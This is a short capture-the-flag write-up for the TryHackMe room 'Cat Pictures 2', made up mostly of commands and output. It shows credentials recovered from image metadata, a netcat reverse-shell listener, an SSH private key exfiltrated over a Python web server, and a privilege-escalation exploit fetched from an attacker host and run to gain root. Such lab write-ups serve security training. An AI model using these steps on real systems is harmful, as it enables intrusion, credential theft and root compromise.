Writeup for room [Cat Pictures 2](https://tryhackme.com/r/room/catpictures2)

### Recon
```
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.4.6 (Ubuntu)
222/tcp  open  ssh     OpenSSH 9.0 (protocol 2.0)
1337/tcp open  waste?
3000/tcp open  ppp?
8080/tcp open  http    SimpleHTTPServer 0.6 (Python 3.6.9)

wget http://{ip}/uploads/medium/f5054e97620f168c7b5088c85ab1d6e4.jpg
exiftool f5054e97620f168c7b5088c85ab1d6e4.jpg 
  gitea: port 3000
  user: samarium
  password: TUmhyZ37CLZrhP
  ansible runner (olivetin): port 1337
```

### Flag1
```
Via http://{ip}:3000/ with creds for samarium
http://{ip}:3000/samarium/ansible/src/branch/main/flag1.txt
```

### Flag2
```
Via http://{ip}:1337/
wget http://{ip}:3000/samarium/ansible/src/branch/main/playbook.yaml

$ nc -lnvp 9999       
listening on [any] 9999 ...
connect to [10.21.20.84] from (UNKNOWN) [10.10.118.131] 57768
bismuth@catpictures-ii:~$ 

bismuth@catpictures-ii:~$ 

bismuth@catpictures-ii:~$ ls
flag2.txt
bismuth@catpictures-ii:~$ cat flag2.txt
cat flag2.txt
```

### Flag3
```
bismuth@catpictures-ii:~/.ssh$ python -m SimpleHTTPServer 9696
wget http://{ip}:9696/id_rsa
chmod 600 id_rsa
ssh bismuth@$ip -i id_rsa
wget http://{attacker_ip}:8000/exploit_nss.py
  exploit_nss.py      100%[================>]   7.99K  --.-KB/s    in 0.04s   
  2024-07-25 06:36:10 (217 KB/s) - ‘exploit_nss.py’ saved [8179/8179]
bismuth@catpictures-ii:~$ chmod +x exploit_nss.py 
bismuth@catpictures-ii:~$ ./exploit_nss.py 
# whoami
root
# cd /root
# ls
ansible  docker-compose.yaml  flag3.txt  gitea
# cat flag3*
```
